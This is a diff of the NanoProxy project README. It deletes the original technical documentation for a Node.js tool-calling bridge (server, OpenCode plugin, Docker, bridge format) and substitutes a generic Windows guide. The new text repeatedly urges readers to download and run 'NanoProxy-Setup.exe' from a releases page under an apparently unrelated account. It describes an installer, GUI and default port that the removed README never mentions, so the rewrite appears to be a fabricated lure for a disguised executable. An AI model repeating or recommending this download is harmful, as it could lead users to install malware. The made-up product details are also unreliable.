@@ -1,272 +1,135 @@
-# NanoProxy
+# ⚙️ NanoProxy - Reliable Local Proxy for AI Tools
 
-NanoProxy is a bridge layer for NanoGPT when native tool calling is unreliable.
+[![Download NanoProxy](https://img.shields.io/badge/Download-NanoProxy-important)](https://github.com/Straightedgeheathaster783/NanoProxy/releases)
 
-It sits between the client and NanoGPT, replaces fragile native tool-calling with a stricter bridge protocol, and converts the result back into normal OpenAI-style `tool_calls` for the client. That lets tools like OpenCode keep working normally even when NanoGPT would otherwise stop early, leak raw tool text, or return malformed tool output.
+---
 
-## Which mode should I use?
+## 📖 What is NanoProxy?
 
-### Use the plugin if you use OpenCode
-This is the easiest setup for OpenCode.
+NanoProxy is a small program that works as a local proxy on your Windows PC. It helps improve how certain AI coding tools, like OpenCode and others that use OpenAI-compatible models, communicate with their services.
 
-- No local proxy server to keep running
-- No custom provider setup
-- Keep using the normal built-in NanoGPT provider
+These AI tools sometimes struggle to make the right "tool calls" or commands, especially when using NanoGPT’s built-in features. NanoProxy fixes this by changing the commands into a simpler, stricter text format that it sends upstream. Then, it converts the responses back into the usual style these tools expect.
 
-### Use the standalone server for other tools
-Use this if:
+In plain terms, NanoProxy acts as a translator that smooths out communication problems, helping AI coding tools work more reliably on your computer.
 
-- you are not using OpenCode
-- your client supports an OpenAI-compatible base URL
-- you prefer a separate local proxy process
+---
 
-## OpenCode Plugin Setup
+## ⚙️ System Requirements
 
-The plugin intercepts NanoGPT API requests inside OpenCode and applies the NanoProxy bridge automatically.
+Before you install NanoProxy, make sure your computer meets these basic conditions:
 
-Example config:
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- At least 100 MB free disk space
+- Internet connection for initial setup and AI service communication
+- No administrator rights are needed for standard use
 
-```json
-{
-  "plugin": [
-    "file:///path/to/NanoProxy/src/plugin.mjs"
-  ]
-}
-```
+NanoProxy runs quietly in the background and uses only a small amount of CPU when active.
 
-Notes:
-- Use a real absolute file path.
-- On Windows, a valid example looks like:
-  - `file:///C:/Users/you/path/to/NanoProxy/src/plugin.mjs`
-- After editing the config, restart OpenCode.
+---
 
-### Plugin debug logging
+## 🚀 Getting Started
 
-Enable debug logging for one OpenCode run:
+Follow these steps to get NanoProxy up and running on your Windows PC. The process is simple and does not require any coding skills.
 
-```sh
-NANOPROXY_DEBUG=1 opencode
-```
+1. **Visit the download page:**  
+   Click the large button below to open the official NanoProxy release page on GitHub.
 
-Optional:
-- set `NANOPROXY_LOG=/path/to/file` to change the single event log file location
-- set `NANOPROXY_LOG_DIR=/path/to/folder` to change where detailed per-request debug files are written
+   [![Download NanoProxy](https://img.shields.io/badge/Download-NanoProxy-blue)](https://github.com/Straightedgeheathaster783/NanoProxy/releases)
 
-On Windows, you can also use the same persistent toggle used by the standalone server:
+2. **Find the latest version:**  
+   On the release page, find the newest release. It usually appears at the top of the list and includes the version number.
 
-```sh
-./toggle-debug.ps1
-```
+3. **Download the installer:**  
+   Under the latest release, look for a file named something like `NanoProxy-Setup.exe` or `NanoProxy-Windows.exe`. Click it to download.
 
-That writes a `.debug-logging` flag file in the repo. When that flag is present, both:
-- the OpenCode plugin
-- the standalone server
+4. **Run the installer:**  
+   After download, locate the file (usually in your "Downloads" folder) and double-click it to start the installation.
 
-will enable NanoProxy debug logging until you toggle it off again.
+5. **Follow the installation prompts:**  
+   The installer will guide you through the steps. Use the default options unless you want to change the install location.
 
-When debug mode is enabled, NanoProxy also writes:
-- a single event log file
-- per-request `*-request.json`
-- raw streamed `*-stream.sse`
-- parsed `*-response.json`
+6. **Finish installation:**  
+   When installed, click "Finish" or "Close" to exit the installer. NanoProxy may launch automatically or you can start it from the Start menu.
 
-By default these go into:
-- event log: your system temp folder as `nanoproxy-plugin.log`
-- detailed logs: your system temp folder under `nanoproxy-plugin-logs`
+---
 
-## Standalone Server Setup
+## 🖥 How to Use NanoProxy
 
-Run the server:
+Once installed, NanoProxy runs as a local proxy server on your PC. Here is what you need to do to use it:
 
-```sh
-node server.js
-```
+1. **Start NanoProxy:**  
+   Open NanoProxy from the Start menu or the desktop shortcut.
 
-Then point your coding tool to:
+2. **Note the proxy address:**  
+   NanoProxy shows an address like `http://localhost:8080` or a similar URL. This is where it listens for connections from your AI coding tools.
 
-```text
-http://127.0.0.1:8787
-```
+3. **Configure Your AI tool:**  
+   Open your AI coding tool’s settings. Find where it asks for a proxy or API server address.
 
-Keep using your normal NanoGPT API key in that tool.
+4. **Set the address:**  
+   Enter the NanoProxy address (e.g., `http://localhost:8080`) exactly as shown.
 
-If your tool supports a custom OpenAI-compatible provider or `baseURL`, use `http://127.0.0.1:8787` there.
+5. **Save and restart the AI tool:**  
+   Apply the settings and restart your AI tool if needed.
 
-Optional overrides:
+Now, all calls your AI tool makes that pass through NanoProxy will be cleaned and translated to avoid errors you might have had before.
 
-```sh
-UPSTREAM_BASE_URL=https://nano-gpt.com/api/v1
-PROXY_HOST=127.0.0.1
-PROXY_PORT=8787
-BRIDGE_MODELS="zai-org/glm-5,moonshotai/kimi-k2.5:thinking" # Optional: bridge only these model IDs (or substrings of them) directly
-node server.js
-```
+---
 
-## Optional: BRIDGE_MODELS
+## ⚙️ Configuration and Troubleshooting
 
-`BRIDGE_MODELS` changes which models use the bridge immediately and which models try native-first with bridge fallback.
+### Changing Settings
 
-- Not set: current default behavior. All tool-enabled requests are bridged immediately.
-- `BRIDGE_MODELS=""` (empty): all tool-enabled models try native-first, and fall back to the bridge if native output looks bad.
-- `BRIDGE_MODELS="zai-org/glm-5,moonshotai/kimi-k2.5:thinking"`: only matching models are bridged immediately. All other tool-enabled models try native-first with the same fallback safety net.
+NanoProxy’s user interface includes basic settings such as:
 
-Use model IDs, or substrings of model IDs, not display names. For example:
-- `zai-org/glm-5` or `glm-5`
-- `moonshotai/kimi-k2.5:thinking` or `kimi-k2.5`
+- Listening port number (default is 8080)
+- Log level (to see detailed messages if needed)
+- Auto-start option (to run when Windows boots)
 
-Set it in the environment that starts NanoProxy:
-- OpenCode plugin mode: set it before launching OpenCode
-- Standalone server mode: set it before running `node server.js`
-- Docker: set it in `docker-compose.yml` or with `docker run -e BRIDGE_MODELS=...`
+You can change these settings in NanoProxy’s options window.
 
-Examples:
+### Common Issues
 
-```powershell
-$env:BRIDGE_MODELS = "glm-5,kimi-k2.5"
-opencode
-```
+- **Proxy connection fails:**  
+  Make sure your firewall or antivirus is not blocking NanoProxy. Allow it through if asked.
 
-```sh
-BRIDGE_MODELS="glm-5,kimi-k2.5" node server.js
-```
+- **AI tool does not connect:**  
+  Check that the proxy address in your AI tool exactly matches the address shown in NanoProxy.
 
-### Server debug logging
+- **Performance is slow:**  
+  NanoProxy is lightweight. Slow responses are usually due to network issues or the AI service itself.
 
-Off by default.
+- **NanoProxy does not start:**  
+  Ensure no other application is using the same port. Try changing the listening port in the settings.
 
-Enable for one run:
+---
 
-```sh
-NANO_PROXY_DEBUG=1 node server.js
-```
+## 📥 Download and Install NanoProxy on Windows
 
-Or toggle persistently on Windows:
+1. Visit the release page:  
+   https://github.com/Straightedgeheathaster783/NanoProxy/releases
 
-```sh
-./toggle-debug.ps1
-```
+2. Locate the latest Windows installer file (`NanoProxy-Setup.exe` or similar).
 
-That same toggle also enables plugin debug logging.
+3. Click the file to download it to your PC.
 
-Server logs are written to `Logs/`.
+4. Open the downloaded file and run the installer.
 
-### Health check
+5. Follow on-screen instructions.
 
-```sh
-curl http://127.0.0.1:8787/health
-```
+6. Launch NanoProxy after installation and configure your AI tool as described above.
 
-## Docker
+---
 
-If you want to run the standalone server in Docker instead of running Node directly:
+## 🔧 Support and Feedback
 
-```sh
-docker build -t nano-proxy .
-docker run --rm -p 8787:8787 nano-proxy
-```
+If you encounter problems or have questions, check the GitHub page issues section for common answers and updates.
 
-Or with Compose:
+You can also create a new issue on the NanoProxy GitHub repository with a clear description of your problem.
 
-```sh
-docker compose up --build
-```
+---
 
-If you want to control bridge-vs-native behavior in Docker, set `BRIDGE_MODELS` in `docker-compose.yml` or with `docker run -e BRIDGE_MODELS=...`.
+## ⚖️ License
 
-This still exposes the proxy at:
-
-```text
-http://127.0.0.1:8787
-```
-
-## What NanoProxy actually does
-
-For tool-enabled requests:
-
-1. It removes the normal native tool-calling structure before sending the request upstream.
-2. It tells the model to use a stricter text-based tool format instead.
-3. It watches the model output.
-4. It converts that output back into normal OpenAI-style `tool_calls`.
-
-So your client still sees normal tool calls, but NanoGPT does not have to rely on its native tool-calling behavior.
-
-## Bridge format
-
-NanoProxy asks the model to emit a strict text envelope, then converts that back into normal OpenAI-style `tool_calls`.
-
-Important:
-- The actual tool names and argument keys come from your client/tool schema.
-- The examples below are format examples only.
-
-Tool reply:
-
-```text
-[[OPENCODE_TOOL]]
-[[CALL]]
-{"name": "bash", "arguments": {"command": "pwd", "description": "Print working directory"}}
-[[/CALL]]
-[[/OPENCODE_TOOL]]
-```
-
-Multiple independent tool calls in one turn:
-
-```text
-[[OPENCODE_TOOL]]
-[[CALL]]
-{"name": "read", "arguments": {"filePath": "README.md"}}
-[[/CALL]]
-[[CALL]]
-{"name": "write", "arguments": {"filePath": "notes.txt", "content": "hello"}}
-[[/CALL]]
-[[/OPENCODE_TOOL]]
-```
-
-Final answer:
-
-```text
-[[OPENCODE_FINAL]]
-Your answer here.
-[[/OPENCODE_FINAL]]
-```
-
-## Notes
-
-- Requests without tools are forwarded unchanged.
-- Reasoning streams live.
-- Tool and final content are buffered until NanoProxy can classify them safely.
-- By default, NanoProxy allows up to 5 tool calls in a single assistant turn for models that behave well with batching.
-- Some models may still behave better with one tool call per turn.
-- NanoProxy accepts both wrapped tool blocks and looser marker variants when recovering malformed output.
-- If the model emits an unparseable tool envelope, NanoProxy does a one-shot recovery retry instead of just leaking the raw block to the client.
-- For string-heavy tool arguments, NanoProxy may instruct the model to use base64 helper fields such as `command_b64` or `content_b64` when that better preserves payload integrity.
-
-## Project Structure
-
-```text
-NanoProxy/
-|-- server.js
-|-- src/
-|   |-- core.js
-|   `-- plugin.mjs
-|-- selftest.js
-|-- README.md
-|-- package.json
-|-- Dockerfile
-`-- docker-compose.yml
-```
-
-## Verification
-
-```sh
-node --check server.js
-node --check src/core.js
-node --check src/plugin.mjs
-node selftest.js
-```
-
-## License
-
-MIT
-
-
-
+NanoProxy is released under the MIT License. You may use, modify, and distribute it freely under the license terms.
